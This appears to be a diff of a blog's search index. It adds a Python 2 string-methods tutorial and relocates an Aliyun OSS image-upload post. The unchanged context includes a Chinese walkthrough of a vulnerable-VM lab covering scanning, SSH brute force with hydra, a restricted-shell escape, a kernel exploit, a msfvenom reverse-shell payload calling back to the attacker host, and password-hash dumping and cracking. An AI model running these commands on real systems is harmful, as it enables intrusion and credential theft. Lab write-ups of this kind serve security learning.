@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[python字符操作]]></title>
+    <url>%2F2018%2F08%2F29%2Fpython%E5%AD%97%E7%AC%A6%E6%93%8D%E4%BD%9C%2F</url>
+    <content type="text"><![CDATA[字符串操作需求 123456&gt; string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）&gt; python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：&gt; 1.python的字符串属性函数&gt; 2.python的string模块&gt; 一次python对字符的操作，人生苦短!&gt; 文档练习实例如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109# coding:utf-8import string"""string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：1.python的字符串属性函数2.python的string模块"""#1.字符串输出格式对齐 str = 'PyTHON heLLo'print str.center(20) #生成20个字符长度，str处于中间位置print str.ljust(20) #生成20个字符，str左对齐print str.rjust(20) #2.大小写转换print str.upper() #转大写print str.lower() #转小写print str.capitalize() #字符串首字母大写，其余小写print str.swapcase() #大小写对换print str.title() #以分隔符为标记，首字符为大写，其余为小写 #3.字符串判断条件str1 = '01234'print str1.isalnum() #判断是否全是数字和字母，并至少有一个字符print str1.isdigit() #判断是否全是数字，并至少有一个字符 str2 = 'string' print str2.isalnum() #判断是否全是数字或字母，并至少有一个字符print str2.isalpha() #判断是否全是字母，并至少有一个字符print str2.islower() #判断是否全是小写字母，当全是小写和数字的组合时也会返回Trueprint str2.isspace() #判断是否全是空白字符，并至少有一个字符print str2.isspace() #判断是否全是大写，如果全是大写和数字也会返回Trueprint str2.istitle() #判断是否每个单词的首字母为大写print str2.startswith('str') #判断字符是否以str开头print str2.endswith('ing') #判断字符是否以ing结尾 #4.字符串搜索定位与替换str3 = 'string IEarn'print str3.find('z') #查找字符串，没有则返回-1，有则返回查找到的第一个索引print str3.rfind('n') #返回索引的最后一次匹配print str3.index('s') #没有匹配则报错，如果匹配到则和find类似，返回第一次索引print str3.count('a') #返回字符串中匹配的次数print str3.replace('n','N') #搜索替换print str3.strip('n') #删除字符串首尾匹配的字符，通常用于默认删除回车符print str3.lstrip('n') #左配符print str3.rstrip('n') #右配符 str4 = 'tab' print str4.expandtabs() #把制表符转换为空格print str4.expandtabs(5)#指定空格数 #5.字符串编码与解码 str5 = "字符串学习"print str5print str5.decode('utf-8') #6.字符串分割变换 str6 = 'Learn string'print '-'.join(str6) str7 = ['Learn','string']print '-'.join(str7) print str6.split('n')print str6.split('n',1) print str6.rstrip('n')print str6.rsplit('n',1)print str6.splitlines()print str6.partition('n')print str6.rpartition('n') #7.打印出一些常用的字符print string.lettersprint string.ascii_letters #两个都是打印出大小写字母 print string.lowercaseprint string.ascii_lowercase #打印小写字母 print string.uppercaseprint string.ascii_uppercase #打印大写字母 print string.digits #打印十进制数字print string.octdigits #打印八进制数字print string.hexdigits #打印十六进制数字print string.printable #打印数字，大小写字母和特殊字符print string.punctuation #打印特殊字符print string.whitespace #打印一些如制表符一样的符号 #8.string中定义的方法"string.capwords(s, sep=None)是多个字符串方法的组合split(),capitalize(),join()"s = 'ahelloaworld'print string.capwords(s, 'a')#等价于：print 'a'.join([i.capitalize() for i in s.split('a')]) #实例：生成200的随机优惠券（长度是20位的） import randomkey = string.letters + string.digitsfor i in range(200): k = [random.choice(key) for i in range(20)] print ''.join(k) 练习图示：]]></content>
+      <tags>
+        <tag>python</tag>
+        <tag>编程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[超级玛丽靶机渗透]]></title>
     <url>%2F2018%2F08%2F19%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
     <content type="text"><![CDATA[靶机渗透 以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。原文链接 搭建环境靶机IP：192.168.0.105 攻击主机IP：192.168.0.106 渗透过程 靶机只有一个登陆界面，所以端口扫描来一波 nmap.exe -sV -p- -T5 192.168.0.105 发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现啥都没有，目录扫描走一波 sudo dirb http://192.168.0.105:8180 /usr/share/dirb/wordlists/big.txt 发现一个vhosts目录，访问以后得到如下信息：发现有服务名，修改本地hosts文件访问一下 然后访问[http://mario.supermariohost.local:8180/ 得到如下界面，并没有发现什么有用的信息，再来一次目录扫描（这里说明一下，本来是没有扫到东西的，所以看了一下原文，发现是扫出来的，也许是字典进行了改进，在后文评论中看到马里奥的弟弟是luigi ，emmm。。果然是） 访问一下地址：发现一串英文，利用cewl对连接进行爬取然后生成一个自定义的字典 ，这里是对一些单词的提取，针对可能有用的进行提取cewl &lt;http://mario.supermariohost.local:8180/&gt; -d -w /root/Desktop/666.txt 利用生成的自定义字典使用john生成一个自定义的密码字典 john --wordlist=/home/dest/666.txt --stdout --rules &gt; 777.txt 这里联想到前面的那个目录luigi和生成的密码，然后对22端口进行爆破 hydra -l luigi -P /home/toml/777.txt 192.168.0.105 ssh -t 20 得到ssh的账号密码，进行登录，登录成功以后发现shell权限被限制了，和python进行沙盒逃逸挺像的 在原文中有一篇关于内网渗透中绕过shell限制的文章：www.4hou.com/penetration/11674.html ，通过awk ‘BEGIN{system(“/bin/bash”)}’ 绕过限制,由于测试过进行总结，所以靶机再没重启 然后进行提权：通过查看内核发现是3.13.0的内核版本，通过公开的提权程序进行提权：https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行 gcc 77.c -o test 拿到root权限 提权成功后在root目录下发现了flag.zip,解压发现需要密码： 将靶机上的flag压缩包下载到本地，利用msf生成后门程序，在靶机上下载执行： sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=7777 -f elf &gt; /var/www/html/5.elf 利用fcrackzip爆破压缩包的密码 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip 查看flag发现要拿到所有的账户密码，这个时候已经在msf上反弹shell了，所以先把所有的hash抓下来 run post/linux/gather/hashdump 然后利用刚才破解的压缩包密码生成字典，将密码保存到一个新的文件夹中，然后生成 john --wordlist=/home/toml/newpass.txt --stdout --rules &gt; newpasse.txt 加载字典，然后本地破解hash，得到所有的账户密码： john --wordlist=/home/toml/newpasse.txt /home/toml/.msf4/loot/20180819175754_default_192.168.0.105_linux.hashes_331263.txt 利用得到的账户密码均登陆成功：渗透完成 总结 本次靶机的渗透测试，看了表哥的文章，思路清晰，收获很多，是一次学习的过程。]]></content>
@@ -34,8 +43,8 @@
         <category>python</category>
       </categories>
       <tags>
-        <tag>编程</tag>
         <tag>python</tag>
+        <tag>编程</tag>
         <tag>CGI编程</tag>
       </tags>
   </entry>
@@ -47,8 +56,8 @@
         <category>python</category>
       </categories>
       <tags>
-        <tag>编程</tag>
         <tag>python</tag>
+        <tag>编程</tag>
         <tag>多进程</tag>
       </tags>
   </entry>
@@ -72,8 +81,21 @@
         <category>python</category>
       </categories>
       <tags>
-        <tag>编程</tag>
         <tag>python</tag>
+        <tag>编程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[阿里云OSS智能上传图床]]></title>
+    <url>%2F2018%2F06%2F13%2F%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A%2F</url>
+    <content type="text"><![CDATA[背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。 程序流程图如下： 功能实现图片截图以后，从粘贴板获取图片保存到本地Image文件夹下 使用win32clipboard，win32con，PIL模块 1234import win32conimport win32clipboard as wfrom PIL import ImageGrabfrom PIL import Image 123im = ImageGrab.grabclipboard() #从粘贴板获取内容 if isinstance(im,Image.Image): #判断是不是图片 name = str(time.time()) + ".png" 获取到图片以后判断是否为图片然后保存到本地 这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存 将图片上传以后的生成的访问地址添加到粘贴板 使用win32clipboard，win32con模块 12345def setText(self,aString): w.OpenClipboard() w.EmptyClipboard() w.SetClipboardData(win32con.CF_TEXT,aString) w.CloseClipboard() 这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码 上传图片到OSS 使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3 123456def upload(self,file_name,name): bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name) data = bucket.put_object_from_file(key='Blog/'+ name,filename='image/'+ name, headers=None, progress_callback=None) str = "https://xxxxxx.xx/" + name shutil.rmtree('image') 这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint 说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合 shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。 设置阿里云OSS的接口信息 通过外部的config文件导入 123456789101112131415try: infoDict = &#123;&#125; with open("config.conf","r") as file: ApiInfo = file.readlines() for info in ApiInfo: try: if info != "\n" and info != "": tmp = info.split("=") infoDict[tmp[0].strip()] = tmp[1].strip() except Exception as e: print u"[-] 请按照要求配置config.conf" sys.exit() except Exception as e: print u"[-] 请在config.conf中配置阿里云 API信息" sys.exit() 结果示例 参考文章 [OSS SDK-Python]:https://github.com/aliyun/aliyun-oss-python-sdk 更新说明 现在已经修改可以支持python3的环境，详情请看github]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>编程</tag>
+        <tag>开发</tag>
       </tags>
   </entry>
   <entry>
@@ -87,19 +109,6 @@
         <tag>安全</tag>
         <tag>parrot</tag>
         <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[阿里云OSS智能上传图床]]></title>
-    <url>%2F2018%2F06%2F13%2F%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A%2F</url>
-    <content type="text"><![CDATA[背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。 程序流程图如下： 功能实现图片截图以后，从粘贴板获取图片保存到本地Image文件夹下 使用win32clipboard，win32con，PIL模块 1234import win32conimport win32clipboard as wfrom PIL import ImageGrabfrom PIL import Image 123im = ImageGrab.grabclipboard() #从粘贴板获取内容 if isinstance(im,Image.Image): #判断是不是图片 name = str(time.time()) + ".png" 获取到图片以后判断是否为图片然后保存到本地 这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存 将图片上传以后的生成的访问地址添加到粘贴板 使用win32clipboard，win32con模块 12345def setText(self,aString): w.OpenClipboard() w.EmptyClipboard() w.SetClipboardData(win32con.CF_TEXT,aString) w.CloseClipboard() 这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码 上传图片到OSS 使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3 123456def upload(self,file_name,name): bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name) data = bucket.put_object_from_file(key='Blog/'+ name,filename='image/'+ name, headers=None, progress_callback=None) str = "https://xxxxxx.xx/" + name shutil.rmtree('image') 这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint 说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合 shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。 设置阿里云OSS的接口信息 通过外部的config文件导入 123456789101112131415try: infoDict = &#123;&#125; with open("config.conf","r") as file: ApiInfo = file.readlines() for info in ApiInfo: try: if info != "\n" and info != "": tmp = info.split("=") infoDict[tmp[0].strip()] = tmp[1].strip() except Exception as e: print u"[-] 请按照要求配置config.conf" sys.exit() except Exception as e: print u"[-] 请在config.conf中配置阿里云 API信息" sys.exit() 结果示例 参考文章 [OSS SDK-Python]:https://github.com/aliyun/aliyun-oss-python-sdk 更新说明 现在已经修改可以支持python3的环境，详情请看github]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>编程</tag>
-        <tag>python</tag>
-        <tag>开发</tag>
       </tags>
   </entry>
   <entry>
